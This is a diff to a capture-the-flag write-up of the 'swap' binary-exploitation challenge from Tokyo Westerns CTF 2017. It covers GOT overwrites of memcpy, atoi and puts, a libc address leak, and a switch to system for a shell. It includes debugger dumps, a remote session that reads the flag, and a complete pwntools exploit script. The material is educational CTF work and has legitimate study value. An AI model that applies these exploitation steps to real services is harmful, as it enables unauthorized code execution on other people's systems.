@@ -1,8 +1,3 @@
----
-layout: post
-title: "swap"
----
-
 # swap - tokyo westerns ctf 3rd 2017
 
 The swapping is interesting. Let's try!
@@ -133,6 +128,16 @@ gef➤  p/d 0x601018
 $4 = 6295576
 ```
 
+  checking the binary protections in place:
+
+```
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
   since the binary has just partial relro enabled the non-PLT GOT is read-only but the GOT is still writable. i went ahead and decompiled the main parts of the program:
 
 ```c
@@ -201,7 +206,14 @@ __int64 read_ll()
 }
 ```
 
-  i had to think through what would happen by replacing memcpy with read, there are three calls to read but the second one is where we've got the most control. assuming we enter "0" for the first input and some destination write address for the second input; the first call would result in a non-fatal error which there are no checks for since our destination buffer would be null, the second call would result in our intended write, and the third call would also result in a non-fatal error. so the plan would be to swap memcpy for read since they take the same type arguments and then we have an arbitrary write primitive. with that we can overwrite atoi, looking at read_int:
+  i had to think through what would happen by replacing memcpy with read, there are three calls to read but the second one is where we've got the most control. assuming we enter "0" for the first input and some destination write address for the second input; the first call would result in a non-fatal error which there are no checks for since our destination buffer would be null, the second call would result in our intended write, and the third call would also result in a non-fatal error. this is all according to the man page which specifies the errno values it _returns_:
+
+```
+       EBADF  fd is not a valid file descriptor or is not open for reading.
+       EFAULT buf is outside your accessible address space
+```
+
+ so the plan would be to swap memcpy for read since they take the same type arguments and then we have an arbitrary write primitive. with that we can overwrite atoi with puts and leak memory off the stack, looking at read_int:
 
 ```c
 int main() {
@@ -226,6 +238,169 @@ __int64 read_int() {
 }
 ```
 
-  we must however consider that after overwriting atoi we potentially cripple our menu because atoi returned the menu option selected. we can however keep our write primitive in tact by abusing the return value of puts, examine the return of puts when we leak mem.
+  and the stack when we call atoi with the selection "1":
 
+```
+$rsi   : 0x00007fffec828cb0  →  0x00007f95c4dd1631  →  0xa300007f95c4dd16               
+$rdi   : 0x00007fffec828cb0  →  0x00007f95c4dd1631  →  0xa300007f95c4dd16
+$rip   : 0x0000000000400908  →  <read_int+66> call 0x400720 <atoi@plt>
+$r8    : 0x00007f95c4ff7700  →  0x00007f95c4ff7700  →  [loop detected]
+$r9    : 0x1999999999999999
+$r10   : 0x0000000000000000
+$r11   : 0x0000000000000246
+$r12   : 0x0000000000400760  →  <_start+0> xor ebp, ebp
+$r13   : 0x00007fffec828e70  →  0x0000000000000001
+$r14   : 0x0000000000000000
+$r15   : 0x0000000000000000
+$cs    : 0x0000000000000033
+$ss    : 0x000000000000002b
+$ds    : 0x0000000000000000
+$es    : 0x0000000000000000
+$fs    : 0x0000000000000000
+$gs    : 0x0000000000000000
+$eflags: [CARRY PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
+──────────────────────────────────────[ stack ]───
+0x00007fffec828ca0│+0x00: 0x00007f95c4dd1620  →  0x00000000fbad2887      ← $rsp
+0x00007fffec828ca8│+0x08: 0x0000000000000001
+0x00007fffec828cb0│+0x10: 0x00007f95c4dd1631  →  0xa300007f95c4dd16      ← $rax, $rsi, $rdi
+0x00007fffec828cb8│+0x18: 0x00007fffec828e70  →  0x0000000000000001
+0x00007fffec828cc0│+0x20: 0x0000000000000000
+0x00007fffec828cc8│+0x28: 0x00007f95c4a86409  →  <_IO_do_write+121> mov r13, rax
+0x00007fffec828cd0│+0x30: 0x000000000000000d
+─────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
+     0x4008ef <read_int+41>    mov    edi, 0x0
+     0x4008f4 <read_int+46>    mov    eax, 0x0
+     0x4008f9 <read_int+51>    call   0x4006d0 <read@plt>
+     0x4008fe <read_int+56>    lea    rax, [rbp-0x90]
+     0x400905 <read_int+63>    mov    rdi, rax
+ →   0x400908 <read_int+66>    call   0x400720 <atoi@plt>
+   ↳    0x400720 <atoi@plt+0>     jmp    QWORD PTR [rip+0x20092a]        # 0x601050
+        0x400726 <atoi@plt+6>     push   0x7
+        0x40072b <atoi@plt+11>    jmp    0x4006a0
+        0x400730 <exit@plt+0>     jmp    QWORD PTR [rip+0x200922]        # 0x601058
+        0x400736 <exit@plt+6>     push   0x8
+        0x40073b <exit@plt+11>    jmp    0x4006a0
+────────────────────────────────────[ threads ]───
+[#0] Id 1, Name: "swap-b878cc5ecf", stopped, reason: BREAKPOINT
+```
 
+##  libc address
+```
+Start              End                Offset             Perm Path
+0x00007f95c4a0c000 0x00007f95c4bcc000 0x0000000000000000 r-x libc.so.6
+```
+
+  notice the libc address that ends in 0x31 ('1') where $rax, $rsi and $rdi point to. you might be wondering why this would ever work as the string we've entered is not ending in a null byte. atoi actually only pays attention to characters between '0' and '9', anything can come afterwards and it will ignore it, so atoi only actually sees the 0x31 and disregards the following characters, puts will leak the rest of these bytes to us though. :)
+
+  we must however consider that after overwriting atoi we potentially cripple our menu because atoi returned the menu option selected. we can however keep our write primitive in tact by abusing the return value of puts, puts returns the number of bytes printed so if we insert null bytes at the right place we can keep using the menu to finish our exploit :smile:.
+
+  from here we can calculate the offset of system in our libc and replace atoi with system, since they both take our string as input we can directly pass system "sh\x00" and get our shell!
+
+```
+$ python pwn-swap.py remote                                                                                                                                                                 vagrant@vagrant
+[*] For remote: pwn-swap.py HOST PORT
+[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 19937: Done
+[*] addr1: 6295616
+[*] addr2: 6295592
+[*] addr1: 0
+[*] addr2: 6295632
+[*] libc leak: 0x00007efe71229000
+[*] writing system to atoi; 0x00007efe7126e390
+[*] Switching to interactive mode
+1
+==============================================
+1. Set addrsses
+2. Swap both addrress of value
+0. Exit
+Your choice:
+$ pwd
+/home/p19937
+$ ls -l
+total 20
+-rw-r----- 1 root p19937   32 Sep  1 19:07 flag
+-rwxr-x--- 1 root p19937   59 Sep  2 00:31 launch.sh
+-rwxr-x--- 1 root p19937 9288 Sep  1 19:07 swap
+$ cat flag
+TWCTF{SWAP_SAWP_WASP_PWAS_SWPA}
+$
+[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 19937
+```
+
+## full exploit code:
+```python
+#!/usr/bin/python
+# pwn swap
+# clampz
+
+import sys
+from pwn import *
+
+bin_name = './swap-b878cc5ecf612cee902acdc91054486bb4cb3bb337a0cfbaf903ba8d35cfcd17'
+host = 'pwn1.chal.ctf.westerns.tokyo'
+port = 19937
+#b *0x00400a58
+#b *0x00400a70
+#b *0x00400a88
+script = """
+b *0x00400908
+c
+"""
+
+puts_got = 0x601018
+puts_plt = 0x4006b6
+read_got = 0x601028
+memcpy_got = 0x601040
+atoi_got = 0x601050
+system_offset = 283536
+
+def set_addrs(addr1, addr2):
+    r.recvuntil("Your choice: \n")
+    r.sendline("1")
+    r.recvuntil("1st addr\n")
+    log.info("addr1: {}".format(addr1))
+    r.sendline(addr1)
+    r.recvuntil("2nd addr\n")
+    log.info("addr2: {}".format(addr2))
+    r.sendline(addr2)
+
+def swap():
+    r.recvuntil("Your choice: \n")
+    r.send("2")
+
+def exploit():
+    # overwrite memcpy w read
+    set_addrs(str(memcpy_got), str(read_got))
+    swap()
+    # overwrite atoi w puts
+    set_addrs(str(0), str(atoi_got))
+    swap()
+    r.send_raw( p64(puts_plt) )
+    # leak libc
+    r.recvuntil("choice: \n")
+    r.send_raw("1")
+    libc = u64(r.recvuntil("choice: \n")[0:6].ljust(8,'\x00')) - 3954225
+    log.info("libc leak: 0x{}".format(p64(libc)[::-1].encode('hex')))
+    # gotta set addrs manually now - overwrite atoi w system
+    r.send_raw("\x00")
+    r.recvuntil("1st addr\n")
+    r.send_raw("0")
+    r.recvuntil("2nd addr\n")
+    r.send_raw(str(atoi_got))
+    r.recvuntil("Your choice: \n")
+    r.send("1\x00")
+    log.info("writing system to atoi; 0x{}".format(p64( libc + system_offset )[::-1].encode('hex')))
+    r.send_raw( p64( libc + system_offset ) )
+    r.send_raw( 'sh\x00' )
+    r.interactive()
+
+if __name__ == "__main__":
+    log.info("For remote: %s HOST PORT" % sys.argv[0])
+    if len(sys.argv) > 1:
+        r = remote(host, port)
+        exploit()
+    else:
+        r = process([bin_name], env={"LD_PRELOAD":"./libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71"})
+        log.info("PID: {}".format(util.proc.pidof(r)))
+#        gdb.attach(r, gdbscript=script)
+        exploit()
+```
